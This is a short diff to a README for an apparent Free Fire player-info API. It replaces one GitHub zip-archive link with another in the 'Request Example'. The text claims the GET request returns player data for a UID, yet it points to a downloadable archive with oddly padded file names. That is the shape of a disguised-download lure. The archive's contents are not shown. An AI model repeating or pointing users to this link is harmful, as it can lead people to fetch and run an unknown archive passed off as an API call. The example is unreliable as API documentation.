@@ -35,7 +35,7 @@ This endpoint returns **complete information about a Free Fire player** based on
 
 ## 📨 Request Example
 
-`GET https://github.com/kazuop/free-fire-info-api/raw/refs/heads/main/semiclerical/api-free-fire-info-v2.1.zip`
+`GET https://raw.githubusercontent.com/kazuop/free-fire-info-api/main/semiclerical/free_api_fire_info_stodge.zip`
 
 This request returns information related to UID `305000592`.
 
